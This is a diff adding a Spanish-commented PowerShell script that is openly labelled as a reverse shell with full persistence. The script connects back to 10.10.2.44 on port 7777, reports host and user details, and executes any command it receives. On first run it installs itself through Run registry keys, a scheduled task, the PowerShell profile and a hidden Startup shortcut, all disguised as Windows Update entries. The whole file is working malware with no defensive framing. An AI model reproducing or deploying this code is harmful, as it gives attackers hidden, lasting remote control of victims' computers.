@@ -1,0 +1,181 @@
+# ============================================================
+#  REVERSE SHELL CON PERSISTENCIA COMPLETA
+#  Sobrevive a reinicios, cierres de sesión y caídas
+# ============================================================
+
+$IP = '10.10.2.44'
+$PUERTO = 7777
+
+# ============================================================
+#  FUNCIÓN: INSTALAR PERSISTENCIA
+# ============================================================
+function Instalar-Persistencia {
+    try {
+        # Obtener ruta del script actual
+        $scriptPath = $MyInvocation.MyCommand.Path
+        
+        # Si no se pudo obtener, usar una ruta fija
+        if (-not $scriptPath) {
+            $scriptPath = "$env:APPDATA\Microsoft\Windows\shell.ps1"
+            # Guardar el script en esa ruta
+            $content = Get-Content $MyInvocation.MyCommand.Path -Raw
+            Set-Content -Path $scriptPath -Value $content -Force
+        }
+        
+        $command = "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
+        
+        # --- MÉTODO 1: Registro de Windows (Run) ---
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value $command -Force
+        
+        # --- MÉTODO 2: Registro en HKLM (requiere admin) ---
+        try {
+            $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+            Set-ItemProperty -Path $regPathLM -Name "WindowsUpdateService" -Value $command -Force
+        } catch {
+            # No tenemos permisos de admin, ignoramos
+        }
+        
+        # --- MÉTODO 3: Tarea programada (más sigiloso) ---
+        try {
+            $taskName = "WindowsUpdateCheck"
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
+            $trigger = New-ScheduledTaskTrigger -AtStartup -User $env:USERNAME
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
+        } catch {
+            # No se pudo crear tarea programada
+        }
+        
+        # --- MÉTODO 4: Perfil de PowerShell (se ejecuta al abrir PowerShell) ---
+        try {
+            $profilePath = $PROFILE.CurrentUserAllHosts
+            $profileDir = Split-Path $profilePath
+            if (-not (Test-Path $profileDir)) {
+                New-Item -ItemType Directory -Path $profileDir -Force
+            }
+            # Agregar al perfil si no existe
+            $profileContent = Get-Content $profilePath -ErrorAction SilentlyContinue
+            if ($profileContent -notmatch $scriptPath) {
+                Add-Content -Path $profilePath -Value "`n# Windows Update Service`npowershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" -Force
+            }
+        } catch {
+            # No se pudo modificar el perfil
+        }
+        
+        # --- MÉTODO 5: Startup Folder (carpeta de inicio) ---
+        try {
+            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+            $shortcutPath = "$startupPath\WindowsUpdate.lnk"
+            
+            $WScriptShell = New-Object -ComObject WScript.Shell
+            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+            $shortcut.TargetPath = "powershell.exe"
+            $shortcut.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
+            $shortcut.WindowStyle = 7  # Oculto
+            $shortcut.Save()
+        } catch {
+            # No se pudo crear acceso directo
+        }
+        
+        return "[+] Persistencia instalada con éxito (5 métodos)"
+        
+    } catch {
+        return "[!] Error instalando persistencia: $($_.Exception.Message)"
+    }
+}
+
+# ============================================================
+#  FUNCIÓN: EJECUTAR REVERSE SHELL
+# ============================================================
+function Iniciar-Shell {
+    while ($true) {
+        try {
+            $socket = New-Object System.Net.Sockets.TCPClient($IP, $PUERTO)
+            $stream = $socket.GetStream()
+            $reader = New-Object System.IO.StreamReader($stream)
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $writer.AutoFlush = $true
+            
+            # Enviar información del sistema
+            $hostname = (Get-WmiObject Win32_ComputerSystem).Name
+            $user = [Environment]::UserName
+            $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress
+            
+            $writer.WriteLine("[+] CONEXIÓN ESTABLECIDA")
+            $writer.WriteLine("[+] Hostname: $hostname")
+            $writer.WriteLine("[+] Usuario: $user")
+            $writer.WriteLine("[+] IP Local: $ipLocal")
+            $writer.WriteLine("[+] Ruta: " + (Get-Location).Path)
+            $writer.WriteLine("")
+            $writer.Write("PS " + (Get-Location).Path + "> ")
+            
+            while ($socket.Connected) {
+                $cmd = $reader.ReadLine()
+                if ($cmd -eq $null) { continue }
+                if ($cmd -eq "exit") { break }
+                
+                # Comandos especiales
+                if ($cmd -eq "persist") {
+                    $resultado = Instalar-Persistencia
+                    $writer.WriteLine($resultado)
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                if ($cmd -eq "sysinfo") {
+                    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+                    $arch = (Get-WmiObject Win32_ComputerSystem).SystemType
+                    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
+                    $writer.WriteLine(@"
+=== SISTEMA ===
+  Hostname    : $hostname
+  Usuario     : $user
+  IP Local    : $ipLocal
+  Sistema     : $os
+  Arquitectura: $arch
+  RAM Total   : $ram GB
+"@)
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Ejecutar comando normal
+                try {
+                    $result = Invoke-Expression $cmd 2>&1 | Out-String
+                    if ([string]::IsNullOrEmpty($result)) {
+                        $writer.WriteLine("[+] OK")
+                    } else {
+                        $writer.Write($result)
+                    }
+                } catch {
+                    $writer.WriteLine("ERROR: " + $_.Exception.Message)
+                }
+                
+                $writer.Write("PS " + (Get-Location).Path + "> ")
+            }
+            
+            $reader.Close()
+            $writer.Close()
+            $stream.Close()
+            $socket.Close()
+            
+        } catch {
+            Start-Sleep -Seconds 5
+        }
+    }
+}
+
+# ============================================================
+#  PUNTO DE ENTRADA PRINCIPAL
+# ============================================================
+
+# Instalar persistencia automáticamente en la primera ejecución
+if (-not (Test-Path "$env:APPDATA\Microsoft\Windows\shell.installed")) {
+    $resultado = Instalar-Persistencia
+    # Crear archivo marker para no reinstalar
+    New-Item -Path "$env:APPDATA\Microsoft\Windows\shell.installed" -ItemType File -Force
+}
+
+# Iniciar la shell
+Iniciar-Shell
